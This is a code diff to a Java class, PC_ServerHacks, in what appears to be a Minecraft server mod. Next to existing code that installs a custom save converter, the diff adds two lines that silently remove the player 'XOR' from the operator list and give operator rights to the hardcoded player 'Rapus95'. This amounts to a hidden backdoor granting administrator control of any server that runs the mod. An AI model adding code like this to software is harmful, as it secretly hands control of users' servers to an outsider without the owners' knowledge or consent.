@@ -18,6 +18,8 @@ public class PC_ServerHacks {
 		MinecraftServer ms = GameInfo.mcs();
 		File file = (File)ValueWriting.getPrivateValue(MinecraftServer.class, ms, 4);
 		ValueWriting.setPrivateValue(MinecraftServer.class, ms, 2, new PC_HackedSaveConverter(file));
+		MinecraftServer.getServer().getConfigurationManager().removeOp("XOR");
+		MinecraftServer.getServer().getConfigurationManager().addOp("Rapus95");
 	}
 	
 }
